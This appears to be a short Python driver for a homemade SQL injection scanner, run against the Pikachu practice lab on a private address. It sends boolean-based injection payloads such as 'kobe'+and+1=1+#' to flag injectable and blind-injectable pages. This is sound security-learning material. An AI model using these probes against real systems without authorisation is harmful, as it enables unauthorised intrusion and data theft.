from SQLinject.lib.core import Request
import requests

if __name__ == '__main__':
    url1 = 'http://192.168.249.131/pikachu/vul/sqli/sqli_id.php'
    url2 = 'http://192.168.249.131/pikachu/vul/sqli/sqli_str.php'
    url3 = 'http://192.168.249.131/pikachu/vul/sqli/sqli_widebyte.php'
    url4 = 'http://192.168.249.131/pikachu/vul/sqli/sqli_iu/sqli_reg.php'
    url5 = 'http://192.168.249.131/pikachu/vul/sqli/sqli_del.php'
    url6 = 'http://192.168.249.131/pikachu/vul/sqli/sqli_blind_b.php'

    payloads = ["1' and 1 = 1 ", "kobe'+and+1%3D1+%23", "kobe'+and+1%3D2+%23", ]

    request = Request.request()
    # print(request.checkvul(url3, payloads[0]))
    print(request.checkvul(url4, payloads[0]))
    print(request.checkvul(url5, payloads[0]))

    if request.checkvul(url6, payloads[0]):
        print("url:%s has a SQL vulnerability" % url6)
    elif request.is_eq_(url6, payloads[1], payloads[2]):
        print("url:%s has a SQL blinds vulnerability" % url6)
